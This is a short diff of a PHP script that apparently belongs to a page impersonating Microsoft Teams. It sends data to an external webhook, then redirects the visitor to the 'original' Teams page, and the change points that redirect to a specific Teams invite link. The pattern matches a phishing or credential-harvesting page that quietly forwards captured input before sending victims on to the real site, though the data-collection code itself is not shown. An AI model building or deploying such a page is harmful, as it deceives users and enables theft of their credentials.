@@ -22,6 +22,7 @@ $context = stream_context_create($options);
 file_get_contents($webhook_url, false, $context);
 
 // Orijinal Teams sayfasına yönlendir
-header("Location: https://teams.microsoft.com");
+header("Location: https://teams.live.com/l/invite/FEAY498D4-fngOaPQE");
 exit;
+
 ?>
